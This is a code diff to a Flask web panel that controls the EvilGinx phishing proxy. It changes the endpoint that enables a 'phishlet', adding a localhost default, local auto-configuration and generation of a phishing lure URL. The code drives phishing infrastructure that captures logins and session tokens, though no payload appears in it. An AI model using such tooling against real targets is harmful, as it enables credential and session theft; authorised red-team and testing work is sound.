@@ -45,17 +45,39 @@ def phishlet_detail(name):
 @evilginx_bp.route('/api/phishlet/enable', methods=['POST'])
 @login_required
 def api_enable_phishlet():
-    """Enable a phishlet"""
+    """Enable a phishlet for local testing"""
     data = request.get_json()
     phishlet_name = data.get('name')
-    hostname = data.get('hostname')
+    hostname = data.get('hostname') or f"{phishlet_name}.localhost"
     
     controller = get_evilginx_controller()
     
-    if controller.enable_phishlet(phishlet_name, hostname):
-        return jsonify({'success': True, 'message': f'Enabled {phishlet_name}'})
-    else:
-        return jsonify({'success': False, 'error': 'Failed to enable phishlet'}), 500
+    try:
+        # For local development, auto-configure
+        if 'localhost' in hostname:
+            # Ensure EvilGinx is configured for local
+            controller.configure_for_local()
+            
+            # Enable phishlet
+            if controller.enable_phishlet_local(phishlet_name):
+                # Create lure
+                lure_url = controller.create_lure(phishlet_name)
+                
+                return jsonify({
+                    'success': True, 
+                    'message': f'Enabled {phishlet_name}',
+                    'hostname': hostname,
+                    'lure_url': lure_url or f'http://{hostname}:443'
+                })
+        
+        # Original behavior for non-local
+        if controller.enable_phishlet(phishlet_name, hostname):
+            return jsonify({'success': True, 'message': f'Enabled {phishlet_name}'})
+        else:
+            return jsonify({'success': False, 'error': 'Failed to enable phishlet'}), 500
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @evilginx_bp.route('/api/phishlet/disable', methods=['POST'])
 @login_required
